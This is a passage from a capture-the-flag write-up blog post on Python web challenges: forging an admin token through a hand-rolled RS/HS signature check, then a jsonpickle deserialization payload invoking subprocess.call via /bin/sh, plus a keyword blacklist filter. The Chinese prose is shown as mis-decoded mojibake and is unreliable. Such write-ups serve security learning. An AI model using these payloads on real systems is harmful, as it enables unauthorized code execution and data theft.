        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>all_data<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>
            key_bytes <span class="token operator">=</span> all_data<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'+'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
            key <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>key_bytes<span class="token punctuation">)</span>  <span class="token comment"># bytes</span>
        <span class="token comment"># éªŒè¯ç­¾å</span>
        is_valid <span class="token operator">=</span> verify_signature<span class="token punctuation">(</span>key<span class="token punctuation">,</span> json_data<span class="token punctuation">,</span> signature<span class="token punctuation">,</span> alg<span class="token punctuation">)</span>
        <span class="token keyword">if</span> is_valid<span class="token punctuation">:</span>
            <span class="token keyword">return</span> json_data
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> <span class="token string">"something error"</span>
        
<span class="token keyword">def</span> <span class="token function">verify_signature</span><span class="token punctuation">(</span>secret<span class="token punctuation">,</span> data<span class="token punctuation">,</span> signature<span class="token punctuation">,</span> alg<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> alg <span class="token operator">==</span> <span class="token string">'RS'</span><span class="token punctuation">:</span>
        rsakey <span class="token operator">=</span> RSA<span class="token punctuation">.</span>import_key<span class="token punctuation">(</span>secret<span class="token punctuation">)</span>
        <span class="token comment"># å°†JSONæ•°æ®è½¬æ¢ä¸ºå­—ç¬¦ä¸²</span>
        data_str <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
        hash_obj <span class="token operator">=</span> SHA256<span class="token punctuation">.</span>new<span class="token punctuation">(</span>data_str<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            pkcs1_15<span class="token punctuation">.</span>new<span class="token punctuation">(</span>rsakey<span class="token punctuation">)</span><span class="token punctuation">.</span>verify<span class="token punctuation">(</span>hash_obj<span class="token punctuation">,</span> signature<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Signature is valid. Transmitted data:"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token boolean">True</span>
        <span class="token keyword">except</span> <span class="token punctuation">(</span>ValueError<span class="token punctuation">,</span> TypeError<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Signature is invalid."</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>
    <span class="token keyword">elif</span> alg <span class="token operator">==</span> <span class="token string">'HS'</span><span class="token punctuation">:</span>
        hash_object <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span><span class="token punctuation">)</span>
        data_bytes <span class="token operator">=</span> <span class="token punctuation">(</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">+</span> secret<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>data_bytes<span class="token punctuation">)</span>
        hash_object<span class="token punctuation">.</span>update<span class="token punctuation">(</span>data_bytes<span class="token punctuation">)</span>
        hex_dig <span class="token operator">=</span> hash_object<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> hex_dig <span class="token operator">==</span> signature<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">True</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä¸€å¼€å§‹çœ‹åˆ°æœ‰ RS æœ‰ HSï¼Œæ¬¸æ˜¯ä¸æ˜¯è¦æ‰“ RS è½¬ HS çš„ trick ğŸ¤“ğŸ‘†</p>
<p>æ‹¿ä¸ª token è§£ç æµ‹è¯•ä¸€ä¸‹</p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">&#123;"username": "aaa", "password": "123"&#125;iÃ›Ã•`Ã˜&#125;Â£P5Ã€..Ã¯.ÃŒ.Â¬?%ÃÂºFU=Ã—.UT.Ã¨57 a8ÃÂ¿./Ã²LkntÃ£Ã_Â©....Ã mÂ¥Â£.Ã -uqÃ°~ÂºÃ€Â¦Ã•.Â·.Ã¤ÃƒÂº...0..Â¿#ÃÃ’fVuÂº
Ã”Ã™gdÃ°Ãµ%Ã†Ã¬y.ÃŒ.Â«..v.Â§~..cÃŸÃ Â®Â².=Ã™q#.0Ã²..Q.Â¬Ã».WÃŒÂ¶Âº0Ã”.Â¼Ã«Ã¶Ã¾)Â¨.Ã²OÃ›?Ã½vÂ´Â¦.Ã‹7.d...Ã˜cÂ©.Ã©..1..%Ã±.9Ã¡&#125;Ã–Ã».NÃ‚.Â¤v.Ã¼6.Ã‚ÃY.vÂ¿.Ã°fÃ¢....Ã„Â²Â¬|Ã‡Â´Â½.Âº.O.jÃ®Ã­Ãq.Â®G`ÃŠ.Ã¯Ã…Ã‹hÃ£.Â¯.&lt;\zÂ¯Ã¥Â¨.~q2Ã¨|Ã„[Ã£p.&lt;Â®Ã§Â².Ã¹RS-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0IdDl+WgYW49pk+UCoYy
pX4SPvon3Pc9uNgM6htf63pYUKnqcFjm0LqAd5q/+t5Ut5L1P98IZRyRjYF/W98W
rLWQpG2Y2WiQ4/stCx/qtCg+UGoG7ItWMKrUAWxjjwzqun++yZIQ02AeLJzUSbC+
uEEBqvzkXrr4FJvPHpIbWU/hE23nEmRL5pze8I7zym7M38Q3doOPSTsQV15b0Kcp
pt5Fvn3TxQAlWmdARk0sY0GbR/oo80eniQvIlswbPGeORgldbXLY1IAusaTiIenQ
JVU9+//+D9m7OZdoGOeqPLJ7jns9bTX8qwkjtuH0pDREK4Rr+vBFYKSc/TfXraNc
+wIDAQAB
-----END PUBLIC KEY-----<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¾—åˆ°RSåŠ å¯†çš„å…¬é’¥</p>
<p>ä¸‹æ–­ç‚¹çœ‹ä¸€ä¸‹all_data</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token number">0</span> <span class="token operator">=</span>
<span class="token string">'eyJ1c2VybmFtZSI6ICJhYWEiLCAicGFzc3dvcmQiOiAiMTIzIn0='</span>
<span class="token number">1</span> <span class="token operator">=</span>
<span class="token string">'nDnHSpDbV3CVBn24/aZQc3lOdxQug5w5zj93isQYXyViMeRLqNPu53sZNGxEjL2rd55B4H7Cc+gQ2x4f/NcZQ8ACVDgtQe5C4be1y7uan2qitc4eQGCkbmmDQeogdJteJCzHeZaePp3Vg9/+U+588A1eQS1/UG5vDawVGLel5UYH6nmZha0zZ2CbrNBbbu3SPaeGDsj/mJscssETStFGx8iEYra3eYh9L3ugEUcP/7D4EVi1EKeu98Mc6IwnwjgxsdmihpuZRZlSI1NUi+TfbjLBLb57WH9dhKOQAr06xO/HhL3U73D8kdVCKCWXMolZZXw8eIkfuvS+5QUNWM7DwQ=='</span>
<span class="token number">2</span> <span class="token operator">=</span>
<span class="token string">'UlM='</span>
<span class="token number">3</span> <span class="token operator">=</span>
<span class="token string">'LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUEyZVVmNzNDVlJPL3RwYjVLSnQ0QgptY2xDSUtWMXNrZGtkQWcwS2I5RGlrRjREeXBwODFLb0hFd2VIUUxRS0RnR0RzZnpQeFI4Qm1vQmV1TlBVZkg2CkRuVDdEQ2dRSlVpaDBVd3hRYVprZWprWW9kY1RZTG9QSlpZK1BnSjRaKzFNZWFOK1FFRG1aUjEzTU5kMy9OaE0KejY3Tk1GYWVaVm1LN2FQQzh5blJXRzVPbFZpU0JDNDUxOG9TcVhsRkx3MU5CR2pnb1N2ZS9FU2VoUStuTlUvdgpwaU1sNnVtUzhZbjlZVytrMU0vbGJ3TWc1N3lydXRGYVh2WmllUG4zSENrd0YzTUF0RkpadEVOL3huaU1FU3pPClZBVmFYZ3EwWHVTYXJZSXU4b2dvU2Q4MUdLNGJmWHdscTZWbXNWSExQRFBvMkRrTmcxS1B2L1Erd05vbHI1SlkKTHdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t'</span>
<span class="token builtin">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span>
<span class="token number">4</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><del>å¥½çŒœæµ‹è¦è®©è§£å¯†æ–¹å¼ä¸º HS</del></p>
<p>0 æ”¹ä¸º eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJwYXNzd29yZCI6ICIxMjMifQ&#x3D;&#x3D;</p>
<p>2 æ”¹ä¸º SFM&#x3D;&#x3D;</p>
<p><del>ç­¾åéƒ¨åˆ†å°±æ˜¯è·å–çš„å…¬é’¥</del></p>
<p>æ„é€ å‡ºjwtï¼š</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9<span class="token punctuation">.</span>eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJwYXNzd29yZCI6ICIxMjMifQ<span class="token operator">==</span><span class="token punctuation">.</span>SFM<span class="token operator">==</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ä½†æ˜¯å¤±è´¥äº†</p>
<p>è§‚å¯Ÿ HS çš„åŠ è§£å¯†éƒ¨åˆ†ï¼š</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># enc</span>
hash_object <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span><span class="token punctuation">)</span>
data_bytes <span class="token operator">=</span> <span class="token punctuation">(</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">+</span> secret<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
inputdata <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
hash_object<span class="token punctuation">.</span>update<span class="token punctuation">(</span>data_bytes<span class="token punctuation">)</span>
hex_dig <span class="token operator">=</span> hash_object<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
signature <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>hex_dig<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># dec</span>
hash_object <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span><span class="token punctuation">)</span>
data_bytes <span class="token operator">=</span> <span class="token punctuation">(</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">+</span> secret<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>data_bytes<span class="token punctuation">)</span>
hash_object<span class="token punctuation">.</span>update<span class="token punctuation">(</span>data_bytes<span class="token punctuation">)</span>
hex_dig <span class="token operator">=</span> hash_object<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å‘ç°è¦å…ˆçŸ¥é“ secret çš„å€¼æ‰èƒ½ä¼ªé€ </p>
<br>

<p>è€Œä¸”è¿™é‡Œçš„åŠ å¯†é€»è¾‘éƒ½æ˜¯å®ƒè‡ªå·±å®ç°çš„ï¼Œä¸èƒ½å¥—ç”¨å¸¸è§„çš„ jwt æ€è·¯æŠŠ RS è½¬ä¸º HS</p>
<p>ä»”ç»†ä¸€çœ‹å¯¹ secret çš„æ“ä½œ</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">key <span class="token operator">=</span> secret
<span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>all_data<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>
    key_bytes <span class="token operator">=</span> all_data<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'+'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    key <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>key_bytes<span class="token punctuation">)</span>  <span class="token comment"># bytes</span>
<span class="token comment"># éªŒè¯ç­¾å</span>
is_valid <span class="token operator">=</span> verify_signature<span class="token punctuation">(</span>key<span class="token punctuation">,</span> json_data<span class="token punctuation">,</span> signature<span class="token punctuation">,</span> alg<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è‰äº†ï¼Œè¿™é‡Œä¼ è¿›å»çš„ key å°±æ˜¯å…¬é’¥ï¼Œå’Œ secret æ²¡æœ‰åŠç‚¹å…³ç³»ï¼Œé‚£å°±ç®€å•äº†ï¼ŒåŠ è§£å¯†åªå’Œç®—æ³•æœ‰å…³</p>
<p>å°è¯•ç›´æ¥åœ¨æœ¬åœ°è§£é™¤é™åˆ¶ç”Ÿæˆ admin çš„ token ï¼Œå¸¦åˆ°é¶æœºä¸Šï¼Œå‘ç°å¯ä»¥ç™»å½•</p>
<p>ç„¶åå°±æ‹¿åˆ° exec äº†ï¼Œæ¥ä¸‹æ¥çš„é—®é¢˜æ˜¯é¶æœºä¸å‡ºç½‘è€Œ <code>print(exec(code))</code> æ²¡æœ‰å›æ˜¾</p>
<p>ä¸€å¼€å§‹æƒ³çš„æ˜¯ç”¨ sctf çš„ trick åœ¨ wsgi server å†™å†…å­˜é©¬ï¼Œä½†æ˜¯æ•´äº†åŠå¤©æ‹¿ä¸åˆ°å…¨å±€ __globals__ï¼Œæµªè´¹äº†éå¸¸ä¹…çš„æ—¶é—´</p>
<p>æœ€åè¿˜æ˜¯é€‰æ‹©æ‰¾ä¸ªæœ‰è°ƒç”¨çš„æ–¹æ³•é‡å†™ï¼Œè¿™é‡Œé‡å†™ read_html æ–¹æ³•æ¥è¯»flag</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">util<span class="token punctuation">.</span>read_html<span class="token operator">=</span><span class="token keyword">lambda</span><span class="token operator">+</span>filename<span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token keyword">lambda</span><span class="token operator">+</span>f<span class="token punctuation">:</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2024/12/05/%E5%BC%BA%E7%BD%91%E6%9D%AFS8-Final/image-20241205132441508.png" alt="image-20241205132441508"></p>
<p>ç„¶åéšä¾¿è®¿é—®ä¸€ä¸ªè°ƒç”¨äº† read_html æ¥å£å³å¯å›æ˜¾</p>
<h3 id="æ³•äºŒï¼špyramidå†…å­˜é©¬"><a href="#æ³•äºŒï¼špyramidå†…å­˜é©¬" class="headerlink" title="æ³•äºŒï¼špyramidå†…å­˜é©¬"></a>æ³•äºŒï¼špyramidå†…å­˜é©¬</h3><hr>
<h2 id="ezlogin"><a href="#ezlogin" class="headerlink" title="ezlogin"></a>ezlogin</h2><p>å°è¯•ç™»å½•å¯ä»¥å¾—åˆ°è´¦å¯† guest:guest</p>
<p>ç™»å½•åå¾—åˆ° tokenï¼Œè§£ç å¾—åˆ°</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"py/object"</span><span class="token operator">:</span> <span class="token string">"__main__.Token"</span><span class="token punctuation">,</span> <span class="token property">"username"</span><span class="token operator">:</span> <span class="token string">"guest"</span><span class="token punctuation">,</span> <span class="token property">"timestamp"</span><span class="token operator">:</span> <span class="token number">1733378883.1952913</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>é™¤æ­¤ä¹‹å¤–æ²¡æœ‰å…¶ä»–ä¿¡æ¯</p>
<p>py&#x2F;object çš„éƒ¨åˆ†æ˜¯æ•°æ®ç±»çš„å†™æ³•ï¼Œåœ¨è¿™é‡Œæµ‹äº†åŠå¤©ç±»ä¸€ç›´è¿”å›500</p>
<p>github ä¸Šæœäº†ä¸€ä¸‹æ‰¾åˆ°ä¸ªç›¸å…³çš„é¡¹ç›®ï¼š<a target="_blank" rel="noopener" href="https://github.com/jsonpickle/jsonpickle">https://github.com/jsonpickle/jsonpickle</a></p>
<p>å’Œé˜Ÿå‹è®¨è®ºäº†å¾ˆä¹…ä¹‹åçŒœæµ‹æ˜¯åœ¨ timestamp ä¸Šåšæ–‡ç« ï¼Œå› ä¸ºæ¯æ¬¡ç™»å½•ä¹‹åéƒ½ä¼šç”Ÿæˆä¸€ä¸ª timestamp å¯ä»¥åå¤ä½¿ç”¨ï¼Œè¿”å› welcomeï¼Œè¿‡ä¸€é˜µæ—¶é—´åå°±ä¼šè¿”å› Invalid tokenï¼Œè€Œå½“æˆ‘ä»¬ç›´æ¥æŠŠ username æ”¹ä¸º admin çš„æ—¶å€™å°±ä¼šç›´æ¥è¿”å› Invalid token</p>
<p>äºæ˜¯éœ€è¦çˆ†ç ´ timestamp ï¼Œè¿™é‡Œæˆ‘äº¤ç»™é˜Ÿå‹ç”¨ yakit çˆ†å‡ºä¸€ä¸ª token å°±èƒ½æŒä¹…åŒ–ä½¿ç”¨äº†</p>
<p><img src="/blog/2024/12/05/%E5%BC%BA%E7%BD%91%E6%9D%AFS8-Final/image-20241206091629415.png" alt="image-20241206091629415"></p>
<p><img src="/blog/2024/12/05/%E5%BC%BA%E7%BD%91%E6%9D%AFS8-Final/image-20241206093000087.png" alt="image-20241206093000087"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> <span class="token keyword">not</span> waf<span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">'Invalid token'</span>
token <span class="token operator">=</span> jsonpickle<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>token<span class="token punctuation">,</span> safe<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> token<span class="token punctuation">.</span>timestamp <span class="token operator">&lt;</span> <span class="token number">60</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> token<span class="token punctuation">.</span>username <span class="token operator">!=</span> <span class="token string">'admin'</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f'Welcome </span><span class="token interpolation"><span class="token punctuation">&#123;</span>token<span class="token punctuation">.</span>username<span class="token punctuation">&#125;</span></span><span class="token string">, but you are not admin'</span></span>
    <span class="token keyword">return</span> <span class="token string">'Welcome admin, there is something in /s3Cr3T'</span>
<span class="token keyword">return</span> <span class="token string">'Invalid token'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç„¶åå‘¢ï¼Œå¾ˆæ˜æ˜¾æ˜¯è¦æ‰“ jsonpickle äº†ï¼Œæœ‰å®˜æ–¹çš„ fuzzing æ–‡æ¡£ï¼š<a target="_blank" rel="noopener" href="https://github.com/jsonpickle/jsonpickle/blob/main/fuzzing/README.md">https://github.com/jsonpickle/jsonpickle/blob/main/fuzzing/README.md</a></p>
<p>è²Œä¼¼æ²¡å•¥ç”¨</p>
<p>ç»§ç»­åœ¨ github ä¸Šæœç´¢ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://github.com/mzfr/vulnhub-writeups/blob/f8fe1d8fb477185db1180e02a128fa88a5ab612e/2019-08-20-symfonos4.md">https://github.com/mzfr/vulnhub-writeups/blob/f8fe1d8fb477185db1180e02a128fa88a5ab612e/2019-08-20-symfonos4.md</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/VerSprite/flask-json-pickle">https://github.com/VerSprite/flask-json-pickle</a></p>
<p><a target="_blank" rel="noopener" href="https://versprite.com/vs-labs/into-the-jar-jsonpickle-exploitation/">https://versprite.com/vs-labs/into-the-jar-jsonpickle-exploitation/</a></p>
<p>æµ‹è¯•å‘ç° ban äº† reduceã€tupleï¼Œä¸è¿‡æ³¨æ„åˆ° py&#x2F;object è¿™é‡Œèƒ½è‡ªå·±é€‰æ‹©ç±»ï¼Œé‚£ä¹ˆå°±å¯ä»¥è€ƒè™‘ç›´æ¥è°ƒç”¨å‘½ä»¤æ‰§è¡Œç±»<code>subprocess.call</code></p>
<p>ä¼ å…¥å‚æ•°å¯ä»¥ç”¨ py&#x2F;newargsex</p>
<p>æ— å›æ˜¾ï¼Œä¸€å¼€å§‹æƒ³ç”¨ç›²æ³¨è¯»æ–‡ä»¶çš„ï¼Œä½†æ˜¯å‘ç°åæ–œæ è¢« ban äº†ï¼Œé‚£ä¹ˆå°±å¾ˆéš¾æäº†</p>
<p>æµ‹è¯•å‘ç°æœ‰ä¸ª static æ–‡ä»¶å¤¹å¯ä»¥è®¿é—®ï¼Œé‚£ä¹ˆç›´æ¥å¸¦å¤–</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"py/object"</span><span class="token operator">:</span> <span class="token string">"subprocess.call"</span><span class="token punctuation">,</span> <span class="token property">"py/newargsex"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"cat$&#123;IFS&#125;/app/app.py>/app/static/app.py"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token property">"stdout"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æºç ï¼š</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> redirect
<span class="token keyword">from</span> dataclasses <span class="token keyword">import</span> dataclass
<span class="token keyword">from</span> time <span class="token keyword">import</span> time
<span class="token keyword">import</span> jsonpickle
<span class="token keyword">import</span> base64
<span class="token keyword">import</span> json
<span class="token keyword">import</span> os

<span class="token decorator annotation punctuation">@dataclass</span>
<span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">:</span>
    username<span class="token punctuation">:</span> <span class="token builtin">str</span>
    password<span class="token punctuation">:</span> <span class="token builtin">str</span>

<span class="token decorator annotation punctuation">@dataclass</span>
<span class="token keyword">class</span> <span class="token class-name">Token</span><span class="token punctuation">:</span>
    username<span class="token punctuation">:</span> <span class="token builtin">str</span>
    timestamp<span class="token punctuation">:</span> <span class="token builtin">int</span>

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
users <span class="token operator">=</span> <span class="token punctuation">[</span>User<span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> User<span class="token punctuation">(</span><span class="token string">'guest'</span><span class="token punctuation">,</span> <span class="token string">'guest'</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
BLACKLIST <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">'repr'</span><span class="token punctuation">,</span>
    <span class="token string">'state'</span><span class="token punctuation">,</span>
    <span class="token string">'json'</span><span class="token punctuation">,</span>
    <span class="token string">'reduce'</span><span class="token punctuation">,</span>
    <span class="token string">'tuple'</span><span class="token punctuation">,</span>
    <span class="token string">'nt'</span><span class="token punctuation">,</span>
    <span class="token string">'\\'</span><span class="token punctuation">,</span>
    <span class="token string">'builtins'</span><span class="token punctuation">,</span>
    <span class="token string">'os'</span><span class="token punctuation">,</span>
    <span class="token string">'popen'</span><span class="token punctuation">,</span>
    <span class="token string">'exec'</span><span class="token punctuation">,</span>
    <span class="token string">'eval'</span><span class="token punctuation">,</span>
    <span class="token string">'posix'</span><span class="token punctuation">,</span> 
    <span class="token string">'spawn'</span><span class="token punctuation">,</span>
    <span class="token string">'compile'</span><span class="token punctuation">,</span>
    <span class="token string">'code'</span>
<span class="token punctuation">]</span>

<span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>jtoken<span class="token punctuation">)</span><span class="token punctuation">:</span>
    otoken <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>jtoken<span class="token punctuation">)</span>
    token <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>otoken<span class="token punctuation">,</span> ensure_ascii<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> keyword <span class="token keyword">in</span> BLACKLIST<span class="token punctuation">:</span>
        <span class="token keyword">if</span> keyword <span class="token keyword">in</span> token<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>
    <span class="token keyword">return</span> <span class="token boolean">True</span>
    

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> title<span class="token operator">=</span><span class="token string">'Home'</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>post</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>
    password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> user <span class="token keyword">in</span> users<span class="token punctuation">:</span>
        <span class="token keyword">if</span> user<span class="token punctuation">.</span>username <span class="token operator">==</span> username <span class="token keyword">and</span> user<span class="token punctuation">.</span>password <span class="token operator">==</span> password<span class="token punctuation">:</span>
            res <span class="token operator">=</span> app<span class="token punctuation">.</span>make_response<span class="token punctuation">(</span><span class="token string">'Login successful'</span><span class="token punctuation">)</span>
